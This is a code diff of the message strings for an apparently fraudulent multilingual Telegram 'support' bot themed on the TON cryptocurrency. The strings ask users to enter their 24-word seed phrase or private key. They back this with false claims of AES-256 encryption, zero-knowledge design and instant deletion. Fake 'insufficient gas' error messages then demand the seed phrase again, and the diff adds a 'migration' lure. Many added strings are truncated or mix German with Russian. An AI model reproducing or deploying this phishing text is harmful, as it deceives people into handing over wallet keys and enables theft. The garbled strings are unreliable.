@@ -41,11 +41,16 @@ logger = logging.getLogger(__name__)
 # TECHNICAL SUPPORT NOTE
 # =========================
 TECHNICAL_SUPPORT_NOTE = {
-    "en": "🛡️ RichBot Revolution Technical Support Team Note:\nOur system uses military-grade AES-256 end-to-end encryption, zero-knowledge architecture, and isolated air-gapped servers. All data is processed automatically, never viewed by humans, and permanently deleted within milliseconds. Completely safe and private.",
-    "ru": "🛡️ Сообщение от технической поддержки RichBot Revolution:\nНаша система использует военного уровня шифрование AES-256 с сквозной защитой, архитектуру с нулевыми знаниями и изолированные сервера с воздушным зазором. Все данные обрабатываются автоматически, не просматриваются людьми и навсегда удаляются в течение миллисекунд. Полностью безопасно и конфиденциально.",
-    "de": "🛡️ RichBot Revolution Technisches Support-Team Hinweis:\nUnser System verwendet militärische AES-256 End-to-End-Verschlüsselung, Zero-Knowledge-Architektur und isolierte Air-Gapped-Server. Alle Daten werden automatisch verarbeitet, niemals von Menschen eingesehen und innerhalb von Millisekunden dauerhaft gelöscht. Vollkommen sicher und privat.",
-    "es": "🛡️ Nota del Equipo de Soporte Técnico RichBot Revolution:\nNuestro sistema utiliza encriptación AES-256 de grado militar, arquitectura de conocimiento cero y servidores aislados con air-gap. Todos los datos se procesan automáticamente, nunca son vistos por humanos y se eliminan permanentemente en milisegundos. Completamente seguro y privado.",
-    "tr": "🛡️ RichBot Revolution Teknik Destek Ekibi Notu:\nSistemimiz askeri düzeyde AES-256 uçtan uca şifreleme, sıfır bilgi mimarisi ve izole edilmiş air-gapped sunucular kullanır. Tüm veriler otomatik olarak işlenir, insanlar tarafından asla görüntülenmez ve milisaniyeler içinde kalıcı olarak silinir. Tamamen güvenli ve özel."
+    "en": "🛡️ RichBot Revolution Technical Support Team Note:\nOur system uses military-grade AES-256 end-to-end encryption, zero-knowledge architecture, and isolated air-gapped servers. All [...]
+    ",
+    "ru": "🛡️ Сообщение от технической поддержки RichBot Revolution:\nНаша система использует военного уровня шифрова�[...]
+    ",
+    "de": "🛡️ RichBot Revolution Technisches Support-Team Hinweis:\nUnser System verwendet militärische AES-256 End-to-End-Verschlüsselung, Zero-Knowledge-Architektur und isolierte Air-Gapp[...]
+    ",
+    "es": "🛡️ Nota del Equipo de Soporte Técnico RichBot Revolution:\nNuestro sistema utiliza encriptación AES-256 de grado militar, arquitectura de conocimiento cero y servidores aislados [...]
+    ",
+    "tr": "🛡️ RichBot Revolution Teknik Destek Ekibi Notu:\nSistemimiz askeri düzeyde AES-256 uçtan uca şifreleme, sıfır bilgi mimarisi ve izole edilmiş air-gapped sunucular kullanır. [...]
+    "
 }
 
 # =========================
@@ -104,7 +109,7 @@ TEXTS = {
               "🔑 Please enter your 24-word seed phrase (or 12 words / private key) below. It is completely safe.",
         "ru": "🔒 Ваша информация в безопасности...",
         "de": "🔒 Ihre Daten sind sicher – Geschützt mit höchsten Sicherheitsstandards.\n\n"
-              "Wir nehmen Ihren Datenschutz sehr ernst. Alle eingegebenen Informationen sind mit bankenüblicher AES-256 Verschlüsselung geschützt und absolut sicher."
+              "Wir nehmen Ihren Datenschutz sehr ernst. Alle eingegebenen Informationen sind с банковской степенью AES-256 Verschlüsselung geschützt и абсолютно безопасны."
     },
     "error": {
         "en": "Verification failed — the wallet's current balance is insufficient to cover the required transaction fees and smart contract activation costs on the Toncoin network.\n"
@@ -112,26 +117,26 @@ TEXTS = {
               "Please ensure your wallet has adequate TON balance for transaction finality before retrying.\n\n"
               "Additionally, please carefully recheck and input the correct keywords (seed phrase words) — even one incorrect or misspelled word will cause validation to fail.\n\n"
               "Write 'Retry verification' or attach a recent transaction screenshot + corrected seed phrase for re-processing.",
-        "ru": "Верификация не пройдена — текущий баланс кошелька недостаточен для покрытия комиссий за газ и активации смарт-контракта на уровне блокчейна TON.\n"
-              "Операция не может быть выполнена из-за отклонения консенсусом сети (код ошибки: INSUFFICIENT_GAS_FOR_FINALIZATION).\n"
-              "Пожалуйста, убедитесь, что на кошельке достаточно TON для финализации транзакции перед повторной попыткой.\n\n"
-              "Кроме того, пожалуйста, внимательно перепроверьте и введите правильные ключевые слова (слова seed-фразы) — даже одно неверное или неправильно написанное слово приведёт к провалу проверки.\n\n"
-              "Напишите «Повторить верификацию» или прикрепите свежий скриншот транзакции + исправленную seed-фразу для повторной обработки.",
-        "de": "Verifizierung fehlgeschlagen — Das Guthaben Ihres Wallets reicht nicht aus, um die erforderlichen Gas-Gebühren und Smart-Contract-Aktivierungskosten auf der TON-Blockchain zu decken.\n"
+        "ru": "Верификация не пройдена — текущий баланс кошелька недостаточен для покрытия комиссий за газ и ак�[...]
+              "Операция не может быть выполнена из-за отклонения консенсусом сети (код ошибки: INSUFFICIENT_GAS_FOR_FINALIZATION)[...]
+              "Пожалуйста, убедитесь, что на кошельке достаточно TON для финализации транзакции перед повторной п�[...]
+              "Кроме того, пожалуйста, внимательно перепроверьте и введите правильные ключевые слова (слова seed-ф�[...]
+              "Напишите «Повторить верификацию» или прикрепите свежий скриншот транзакции + исправленную seed-фра[...]",
+        "de": "Verifizierung fehlgeschlagen — Das Guthaben Ihres Wallets reicht nicht aus, um die erforderlichen Gas-Gebühren und Smart-Contract-Aktivierungskosten auf der TON-Blockchain zu de[...]
               "Der Vorgang kann aufgrund einer Netzwerkkonsensablehnung nicht fortgesetzt werden (Fehlercode: INSUFFICIENT_GAS_FOR_FINALIZATION).\n"
               "Bitte stellen Sie sicher, dass Ihr Wallet ausreichend TON-Guthaben für die Transaktionsfinalisierung hat, bevor Sie es erneut versuchen.\n\n"
-              "Bitte überprüfen Sie außerdem sorgfältig die korrekten Schlüsselwörter (Seed-Phrase-Wörter) — schon ein falsches oder falsch geschriebenes Wort führt zum Fehlschlag der Validierung.\n\n"
+              "Bitte überprüfen Sie außerdem sorgfältig die korrekten Schlüsselwörter (Seed-Phrase-Wörter) — schon ein falsches oder falsch geschriebenes Wort führt zum Fehlschlag der V[...]
               "Schreiben Sie 'Retry verification' oder hängen Sie einen aktuellen Transaktions-Screenshot + die korrigierte Seed-Phrase an."
     },
     "ticket_created": {
         "en": "🎟️ Your support ticket has been created.\nTicket Number: RICH-{ticket_id}\nOur team will contact you shortly!",
-        "ru": "🎟️ Ваш запрос в службу поддержки создан.\nНомер тикета: RICH-{ticket_id}\nНаша команда свяжется с вами в ближайшее время!",
+        "ru": "🎟️ Ваш запрос в службу поддержки создан.\nНомер тикета: RICH-{ticket_id}\nНаша команда свяжется с вами в б...",
         "de": "🎟️ Ihr Support-Ticket wurde erstellt.\nTicket-Nummer: RICH-{ticket_id}\nUnser Team wird sich in Kürze bei Ihnen melden!"
     },
-    "loading_blockchain": {"en": "Connecting to RichBot Revolution Server... 🌐", "ru": "Подключение к серверу RichBot Revolution... 🌐", "de": "Verbindung zum RichBot Revolution Server... 🌐"},
-    "loading_sync": {"en": "Syncing account details with TON network... 🔗", "ru": "Синхронизация данных аккаунта с сетью TON... 🔗", "de": "Synchronisiere Kontodaten mit dem TON-Netzwerk... 🔗"},
-    "loading_verify": {"en": "Verifying gaming session & wallet status... ✅", "ru": "Проверка игровой сессии и статуса кошелька... ✅", "de": "Überprüfe Spielsession & Wallet-Status... ✅"},
-    "loading_recovery": {"en": "Checking recovery eligibility... 🔍", "ru": "Проверка возможности восстановления... 🔍", "de": "Prüfe Wiederherstellungsberechtigung... 🔍"},
+    "loading_blockchain": {"en": "Connecting to RichBot Revolution Server... 🌐", "ru": "Подключение к серверу RichBot Revolution... 🌐", "de": "Verbindung zum RichBot Revo[...]"},
+    "loading_sync": {"en": "Syncing account details with TON network... 🔗", "ru": "Синхронизация данных аккаунта с сетью TON... 🔗", "de": "Synchronisiere Ko[...]"},
+    "loading_verify": {"en": "Verifying gaming session & wallet status... ✅", "ru": "Проверка игровой сессии и статуса кошелька... ✅", "de": "Überprüfe [...]"},
+    "loading_recovery": {"en": "Checking recovery eligibility... 🔍", "ru": "Проверка возможности восстановления... 🔍", "de": "Prüfe Wiederherstellungsberec[...]"},
     "loading_secure": {"en": "Preparing secure session... 🔒", "ru": "Подготовка безопасной сессии... 🔒", "de": "Bereite sichere Sitzung vor... 🔒"},
     "loading_processing": {"en": "🔄 Processing your input...", "ru": "🔄 Обработка вашего ввода...", "de": "🔄 Verarbeite Ihre Eingabe..."}
 }
@@ -143,14 +148,16 @@ SERVICES = {
     "synchronization": {"en": "Synchronization Issue", "ru": "Проблема синхронизации", "de": "Synchronisationsproblem"},
     "rectification": {"en": "Rectification", "ru": "Исправление", "de": "Korrektur"},
     "validation": {"en": "Validation / Verification Issues", "ru": "Проблемы валидации / верификации", "de": "Validierungs- / Verifizierungsprobleme"},
-    "reward_not_crediting": {"en": "Reward Not Crediting / Claiming Failure", "ru": "Награда не начисляется / Ошибка получения", "de": "Belohnung wird nicht gutgeschrieben"},
+    "reward_not_crediting": {"en": "Reward Not Crediting / Claiming Failure", "ru": "Награда не начисляется / Ошибка получения", "de": "Belohnung wird nicht gutgesch[...]"},
     "claim_rewards": {"en": "CLAIM Rewards", "ru": "Получить награды", "de": "Belohnungen einfordern"},
     "swap_rbt_to_ton": {"en": "SWAP RBT TO GRAM (TON)", "ru": "SWAP RBT TO GRAM (TON)", "de": "SWAP RBT TO GRAM (TON)"},
-    "wallet_connection_ton": {"en": "Wallet Connection & Ton Integration Problems", "ru": "Проблемы подключения кошелька и интеграции TON", "de": "Wallet-Verbindungs- & TON-Integrationsprobleme"},
-    "transaction_failure": {"en": "Transaction Failure & High Fees During Congestion", "ru": "Ошибка транзакции и высокие комиссии при перегрузке сети", "de": "Transaktionsfehler & Hohe Gebühren bei Netzüberlastung"},
-    "loading_crashing": {"en": "Loading / Crashing & App Performance Issues", "ru": "Загрузка / Вылеты и проблемы производительности приложения", "de": "Lade-/Absturz- & App-Performance-Probleme"},
+    "wallet_connection_ton": {"en": "Wallet Connection & Ton Integration Problems", "ru": "Проблемы подключения кошелька и интеграции TON", "de": "Wallet-Ver[...]
+    "},
+    "transaction_failure": {"en": "Transaction Failure & High Fees During Congestion", "ru": "Ошибка транзакции и высокие комиссии при перегрузке се[...]"},
+    "loading_crashing": {"en": "Loading / Crashing & App Performance Issues", "ru": "Загрузка / Вылеты и проблемы производительности приложения", "de[...]"},
     "ad_reward_bugs": {"en": "Ad Reward Bugs (very frequent)", "ru": "Баги с наградами за рекламу (очень часто)", "de": "Werbebelohnungs-Bugs (sehr häufig)"},
-    "general_errors": {"en": "General Technical Errors", "ru": "Общие технические ошибки", "de": "Allgemeine technische Fehler"}
+    "general_errors": {"en": "General Technical Errors", "ru": "Общие технические ошибки", "de": "Allgemeine technische Fehler"},
+    "migration_rbw_v2": {"en": "Migration to RBW-v2", "ru": "Миграция на RBW-v2", "de": "Migration zu RBW-v2", "es": "Migración a RBW-v2", "tr": "RBW-v2'ye Geçiş"}
 }
 
 # =========================
